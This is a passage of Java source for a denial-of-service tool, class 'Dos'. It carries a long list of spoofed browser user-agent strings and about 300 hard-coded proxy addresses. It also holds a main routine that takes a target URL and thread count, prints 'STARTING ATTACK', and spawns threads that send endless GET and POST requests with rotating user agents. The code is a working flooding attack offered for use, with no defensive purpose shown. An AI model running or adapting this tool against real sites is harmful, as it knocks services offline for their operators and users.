		"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo TAB 2 A7-30GC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; Micromax E481 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.1; CPH1727) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-A300FU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; BND-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.3.318.00 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.2; Swift 2 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; G3312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; PSP5511DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; FIG-LA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36 OPR/35.0.2066.92",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-J510H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J500F Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; G3112) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; Lenovo TB2-X30L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; SM-A530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; Ixion XL240) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 YaBrowser/18.11.1.1011.00 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; C103) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; Che2-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; Che2-L11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; arm; Android 9; KSA-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.4; Just5-SPACER2s Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A7600-H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; CRO-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; meizu C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; arm_64; Android 7.0; BAH-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.01 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-T805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; ASUS_X00PD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; Lenovo TB3-X70F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; m2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X571) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:45.9) Gecko/20100101 Goanna/3.0 Firefox/45.9 PaleMoon/27.1.2",
		"Mozilla/5.0 (Linux; Android 9; VS996) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 9; SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; DIG-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1.1; PSP5506DUO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; HAWEEL_H1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; SM-G9500 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 YaBrowser/19.9.3.314 Yowser/2.5 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.79 Mobile/16G102 Safari/602.1",
		"Mozilla/5.0 (Linux; Android 9; SM-A600F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0; vivo 1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; 5019D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KA7O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.1.0; itel W5504) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI Y541-U02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/80.0.262003652 Mobile/17A577 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 7.1.1; SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 8.0.0; AGS2-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1",
		"Mozilla/5.0 (Linux; Android 9; LM-G810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; DLI-TL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; X-treme_PQ24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 10_3_4 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/14G61 Safari/602.1",
		"Mozilla/5.0 (Linux; Android 8.1.0; TECNO LA7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.0; Infinix X559 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1",
		"Mozilla/5.0 (Linux; Android 6.0; PMT3118_3G Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36 OPR/42.3.2246.113338",
		"Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.2; SM-T231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3021.84 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 4.4.4; Lenovo TAB 2 A10-70L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 7.1.1; TA-1053) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 10_3_4 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/67.0.3396.69 Mobile/14G61 Safari/602.1",
		"Mozilla/5.0 (Linux; Android 9; SM-A600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 YaBrowser/18.9.2.31.00 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) /20100101 AppleWebKit/537.36 (KHTML, like Gecko) Gecko/20100101 Firefox/68.0 Qazweb/2.0",
		"Mozilla/5.0 (X11; FreeBSD amd64; rv:55.0) Gecko/20100101 Firefox/55.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0/4erS7ObW-66",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0/8mqFuKuL-88",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0/8mqMlPuL-96",
		"Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.8.0.6) Gecko/20060728 Firefox/52.6.0",
		"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
		"Mozilla/5.0 (Mobile; LYF/LF-2406/LYF-LF2406S-000-02-05-260220; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.9) Gecko/20100101 Gecko/3.4 Firefox/52.9 K-Meleon/76.3",
		"Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/68.2.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.4",
		"Mozilla/5.0 (X11; NetBSD i686; rv:82.0) Gecko/20100101 Firefox/82.0",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24",
		"Mozilla/5.0 (Android 7.1.1; Mobile VR; rv:81.0) Gecko/81.0 Firefox/81.0",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4",
		"Mozilla/5.0 (Mobile; MS230_512_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1",
		"Mozilla/5.0 (Android 4.2.2; Mobile; rv:68.8.1) Gecko/68.8.1 Firefox/68.8.1",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; de; rv:1.9.1.1) Gecko/20090715 Firefox/52.4.0",
		"Mozilla/5.0 (Linux; Android 7.0; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36", 
	//add more user agents
	};
	
	String[] proxies = {
		"194.244.232.53:8080", 
		"41.65.236.44:1976", 
		"45.224.28.81:999",
		"45.79.25.95:1080",
		"117.160.250.131:80",
		"31.148.207.153:80",
		"180.235.65.13:80",
		"15.204.161.192:18080",
		"104.37.135.145:4145",
		"47.93.114.68:88",
		"138.68.60.8:8080",
		"184.181.217.201:4145",
		"74.119.147.209:4145",
		"162.55.100.161:53714",
		"68.71.254.6:4145",
		"221.194.149.8:80",
		"142.54.231.38:4145",
		"139.59.1.14:3128",
		"192.252.216.81:4145",
		"167.172.185.202:3000",
		"123.154.17.241:8085",
		"202.103.203.97:9091",
		"192.111.129.145:16894",
		"223.112.53.2:1025",
		"128.199.132.44:80",
		"199.58.184.97:4145",
		"74.119.144.60:4145",
		"78.141.238.119:60723",
		"109.68.189.22:54643",
		"184.178.172.28:15294",
		"192.111.137.34:18765",
		"139.159.176.147:8090",
		"184.178.172.17:4145",
		"111.20.217.178:9091",
		"197.232.47.122:8080",
		"107.181.161.81:4145",
		"38.242.244.63:23553",
		"186.121.235.66:8080",
		"113.195.166.166:8085",
		"176.197.144.158:4153",
		"70.35.199.99:50420",
		"192.111.137.37:18762",
		"142.54.228.193:4145",
		"112.124.2.212:3000",
		"202.110.67.141:9091",
		"117.160.250.133:8899",
		"184.178.172.14:4145",
		"45.63.25.2:8888",
		"118.34.105.254:8080",
		"134.195.101.34:8080",
		"47.92.248.197:9000",
		"115.29.149.2:84",
		"121.37.203.216:7777",
		"47.92.248.197:81",
		"121.37.199.23:5555",
		"124.70.55.29:8060",
		"47.109.52.147:8888",
		"120.79.21.48:8000",
		"121.37.207.154:80",
		"47.92.239.69:4145",
		"47.113.224.182:8889",
		"123.56.129.203:8000",
		"47.113.219.226:8001",
		"47.92.242.45:30001",
		"47.100.207.117:8080",
		"163.181.123.54:8080",
		"39.104.79.145:4006",
		"47.88.11.3:1080",
		"47.88.11.3:6666",
		"37.46.241.247:80",
		"163.181.123.54:8080",
		"16.163.88.228:80",
		"115.29.151.41:3333",
		"47.109.57.93:55443",
		"47.253.214.60:9091",
		"47.253.214.60:500",
		"47.253.214.60:5001",
		"122.9.131.161:4145",
		"124.70.221.252:5001",
		"124.70.221.252:9090",
		"124.70.221.252:8001",
		"139.129.231.228:3132",
		"39.104.89.111:3128",
		"47.92.239.69:45554",
		"121.40.115.140:8082",
		"47.109.53.253:5000",
		"218.104.52.188:80",
		"47.113.221.120:8000",
		"123.56.129.203:10001",
		"47.92.239.69:45554",
		"47.92.247.250:8181",
		"123.57.1.78:8089",
		"8.134.140.97:443",
		"120.55.49.231:6789",
		"120.55.49.231:9999",
		"23.94.15.20:80",
		"47.96.70.163:20002",
		"39.104.62.128:1000",
		"163.181.123.54:8080",
		"8.209.249.96:8999",
		"47.100.207.117:8080",
		"120.79.7.173:8123",
		"121.37.201.60:45554",
		"123.60.109.71:5000",
		"8.213.128.90:8002",
		"8.213.128.90:90",
		"8.209.249.96:11",
		"120.46.197.14:4153",
		"139.196.151.191:9002",
		"121.37.203.216:8499",
		"123.57.1.78:8081",
		"120.46.197.14:4153",
		"124.70.205.56:30001",
		"39.104.79.145:4006",
		"120.46.215.52:82",
		"116.63.130.30:8181",
		"121.37.205.253:9002",
		"115.29.149.2:84",
		"124.70.55.29:8060",
		"115.29.148.215:59394",
		"115.29.148.215:1081",
		"47.92.248.197:81",
		"47.113.224.182:8085",
		"47.92.248.197:3127",
		"47.109.53.253:8081",
		"112.124.2.212:8089",
		"47.113.224.182:1337",
		"120.79.21.48:9000",
		"121.37.199.23:1337",
		"47.113.219.226:8001",
		"81.22.103.65:80",
		"163.181.123.54:8080",
		"16.163.88.228:80",
		"47.100.207.117:8080",
		"115.239.234.43:7302",
		"16.163.88.228:80",
		"47.109.57.93:1111",
		"120.79.7.173:55443",
		"122.9.131.161:3127",
		"49.0.250.196:2080",
		"116.63.130.30:8181",
		"122.9.131.161:1081",
		"47.92.247.250:111",
		"121.37.205.253:9002",
		"115.29.149.2:84",
		"115.29.149.2:4006",
		"115.29.149.2:8888",
		"115.29.149.2:8083",
		"121.37.207.154:999",
		"101.132.25.152:8080",
		"121.37.207.154:80",
		"121.37.205.253:8000",
		"101.200.235.69:4145",
		"47.109.46.223:999",
		"47.109.46.223:4153",
		"120.46.215.52:9992",
		"121.37.201.60:5000",
		"121.37.201.60:8029",
		"120.46.215.52:20000",
		"122.9.131.161:8058",
		"123.60.109.71:8081",
		"121.37.205.253:10000",
		"47.243.50.83:100",
		"115.29.151.41:7890",
		"49.0.252.39:15",
		"121.37.201.60:1000",
		"47.92.247.250:3128",
		"47.253.214.60:8085",
		"112.124.2.212:8086",
		"8.209.64.208:8081",
		"47.92.247.250:8090",
		"121.37.203.216:8083",
		"8.209.64.208:80",
		"8.209.64.208:5000",
		"47.96.70.163:9090",
		"47.98.134.232:5555",
		"121.37.203.216:7777",
		"120.79.31.133:52869",
		"116.63.130.30:83",
		"139.129.231.228:8029",
		"139.196.214.238:8009",
		"139.129.231.228:7777",
		"139.129.231.228:8181",
		"123.60.109.71:8080",
		"47.91.45.235:4006",
		"47.91.45.235:8090",
		"47.91.45.235:1337",
		"47.74.71.208:5000",
		"47.254.47.61:8087",
		"49.0.252.39:3132",
		"47.253.105.175:8083",
		"8.219.5.240:8060",
		"121.37.207.154:80",
		"124.70.55.29:2019",
		"123.57.1.16:50001",
		"8.213.137.155:95",
		"8.213.129.20:8002",
		"8.219.167.110:8082",
		"47.113.221.120:19",
		"139.196.214.238:8024",
		"47.88.29.108:9090",
		"159.138.252.45:8081",
		"47.100.90.127:10443",
		"123.60.139.197:2020",
		"8.219.5.240:5001",
		"123.56.129.203:2019",
		"47.74.71.208:6666",
		"139.196.214.238:18081",
		"47.92.239.69:45554",
		"47.113.230.224:8888",
		"47.91.45.198:8181",
		"96.126.118.190:801",
		"47.74.71.208:2000",
		"8.213.137.155:21025",
		"94.74.80.88:8192",
		"8.219.5.240:9002",
		"47.98.134.232:8082",
		"198.11.175.192:6969",
		"47.113.221.120:3132",
		"115.29.140.201:8020",
		"110.238.116.82:5001",
		"47.254.158.115:20201",
		"47.88.29.108:84",
		"47.91.95.174:9002",
		"47.254.153.78:135",
		"110.238.111.229:8080",
		"47.74.64.65:8080",
		"16.163.88.228:80",
		"110.238.113.119:6666",
		"47.253.214.60:8888",
		"47.254.153.78:13579",
		"198.11.175.192:8081",
		"198.11.175.180:4444",
		"110.238.116.82:6666",
		"101.132.25.152:789",
		"139.196.151.191:443",
		"120.79.31.133:19",
		"8.219.43.134:55553",
		"101.200.235.69:999",
		"47.92.248.197:81",
		"47.109.57.93:8060",
		"49.0.250.196:8024",
		"115.239.234.43:7302",
		"47.92.239.69:7890",
		"115.29.151.41:8989",
		"39.104.79.145:30001",
		"8.210.37.63:8192",
		"47.91.95.174:80",
		"47.109.46.223:10000",
		"8.219.167.110:45554",
		"47.243.50.83:8499",
		"47.243.50.83:8080",
		"16.163.88.228:80",
		"96.126.118.190:80",
		"8.209.253.237:8192",
		"101.200.235.69:9443",
		"110.238.111.229:8012",
		"110.238.109.146:8024",
		"120.79.7.173:8889",
		"39.104.26.204:41890",
		"47.91.45.198:1000",
		"47.109.52.147:81",
		"47.113.219.226:502",
		"47.92.242.45:80",
		"47.92.248.86:8058",
		"47.92.247.250:4006",
		"47.92.239.69:3129",
		"8.213.128.6:80",
		"8.213.128.6:888",
		"47.98.134.232:20201",
		"8.219.74.58:993",
		"47.96.70.163:808",
		"47.92.248.86:84",
		"8.209.253.237:8080",
		"8.213.129.15:20002",
		"8.213.129.15:10",
		"120.46.197.14:41890",
		"47.109.52.147:8123",
		"8.209.253.237:8192",
		"49.0.246.130:3128",
		"8.219.169.172:5001",
		"110.238.113.119:82",
		"49.0.253.51:8080",
		"47.243.124.21:9091",
		"110.238.109.146:5000",
		"47.243.242.70:10",
		"120.79.34.201:7890",
		"49.0.253.51:84",
		"8.213.129.20:80",
		"47.243.124.21:593",
		"112.124.2.212:8020",
		"119.13.111.169:80",
		"8.213.128.90:5566",
		"119.13.111.169:118",
		"47.74.71.208:8081",
		"47.113.221.120:808",
		"139.196.151.191:8889",
		"47.252.1.180:20000",
		"8.219.43.134:20000",
		"8.209.64.208:8080",				
        "176.98.234.124:8080", 
            // Tambahkan proxy lainnya sesuai kebutuhan
        };
    
    private static int amount = 0;
    private static String url = "";
    int seq;
    int type;

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Dos.url);
                        break;
                    case 2:
                        sslPostAttack(Dos.url);
                        break;
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;
                    case 5:
                        dandierGet(Dos.url);
                        break;
                    case 6:
                        dandierGets(Dos.url);
                        break;
                    case 7:
                        dandierPos(Dos.url);
                        break;
                    case 8:
                        dandierPost(Dos.url);
                        break;
                    case 9:
                        dandierGe(Dos.url);
                        break;
                    case 10:
                        dandierPo(Dos.url);
                        break;
                    case 11:
                        dandierG(Dos.url);
                        break;
                    case 12:
                        dandierP(Dos.url);
                        break;
                    case 13:
                        dandierG1(Dos.url);
                        break;
                    case 14:
                        dandierG2(Dos.url);
                        break;
                    case 15:
                        dandierG3(Dos.url);
                        break;
                    case 16:
                        dandierG4(Dos.url);
                        break;
                    case 17:
                        dandierG5(Dos.url);
                        break;
                    case 18:
                        dandierG6(Dos.url);
                        break;
                    case 19:
                        dandierG7(Dos.url);
                        break;
                    case 20:
                        dandierG8(Dos.url);
                        break;
                    case 21:
                        dandierG9(Dos.url);
                        break;
                    case 22:
                        dandierG10(Dos.url);
                        break;
                    case 23:
                        dandierP1(Dos.url);
                        break;
                    case 24:
                        dandierP2(Dos.url);
                        break;
                    case 25:
                        dandierP3(Dos.url);
                        break;
                    case 26:
                        dandierP4(Dos.url);
                        break;
                    case 27:
                        dandierP5(Dos.url);
                        break;
                    case 28:
                        dandierP6(Dos.url);
                        break;
                    case 29:
                        dandierP7(Dos.url);
                        break;
                    case 30:
                        dandierP8(Dos.url);
                        break;
                    case 31:
                        dandierP9(Dos.url);
                        break;
                    case 32:
                        dandierP10(Dos.url);
                        break;
                    case 33:
                        dandierP11(Dos.url);
                        break;
                    case 34:
                        dandierP12(Dos.url);
                        break;
                    case 35:
                        dandierP13(Dos.url);
                        break;
                    case 36:
                        dandierP14(Dos.url);
                        break;
                    case 37:
                        dandierP15(Dos.url);
                        break;                                                                                 
                }
            }
        } catch (Exception e) {

        }
    }
 
    public static void main(String[] args) throws Exception {
    	System.out.flush();
	    ProcessBuilder processBuilder = new ProcessBuilder("clear");
	    if (args.length != 2) {
            System.out.println("Usage: java input2.java <url> <thread>");
            return;
        }
        String url = args[0];
        int amount = Integer.parseInt(args[1]);
        Dos.amount = amount;
        Process process = processBuilder.inheritIO().start();
        process.waitFor();
        int attakingAmoun = 0;
        Dos dos = new Dos(0, 0);
        Scanner in = new Scanner(System.in);
        System.out.println("\n");
        System.out.println("Starting Attack to url: \u001B[32m" + url);
        System.out.println("\u001B[31mStarting Attack thread: \u001B[32m" + amount);
          
        String[] SUrl = url.split("://");

        System.out.println("\u001B[31mChecking connection to Site");
        if (SUrl[0] == "http" || SUrl[0].equals("http")) {
            dos.checkConnection(url);
        } else {
            dos.sslCheckConnection(url);
        }
        
        String option = "GET";
        int ioption = 1;
        if (option == "get" || option == "GET") {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 3;
            } else {
                ioption = 4;
            }
        } else {
            if (SUrl[0] == "http" || SUrl[0].equals("http")) {
                ioption = 1;
            } else {
                ioption = 2;
            }
        }
        
        Thread.sleep(1000);
        System.out.println("\n");
        System.out.println("\u001B[31mSTARTING ATTACK");
        ArrayList<Thread> threads = new ArrayList<Thread>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new Dos(i, ioption));
            t.start();
            threads.add(t);
        }

        for (int i = 0; i < threads.size(); i++) {
            Thread t = threads.get(i);
            try {
                t.join();
            } catch (Exception e) {

            }
        }
        System.out.println("Main Thread ended");
    }

    private void checkConnection(String url) throws Exception {
        System.out.println("Checking Connection");
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        
        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("\u001B[32mConnected to website");
            System.out.println("\n");
        }
        Dos.url = url;
    }

    private void sslCheckConnection(String url) throws Exception {
        System.out.println("Checking Connection (ssl)");
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("\u001B[32mConnected to website");
            System.out.println("\n");
        }
        Dos.url = url;
    }
    
    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
        int responseCode = con.getResponseCode();
        
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
	    con.setRequestProperty("User-Agent", randomUserAgent);
        int responseCode = con.getResponseCode();
        
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        Random random = new Random();
        String randomUserAgent = userAgents[random.nextInt(userAgents.length)];
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", randomUserAgent);
        con.setRequestProperty("Accept-Language", "en-US,en;");
        String urlParameters = "out of memory";
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(urlParameters);
        wr.flush();
        wr.close();
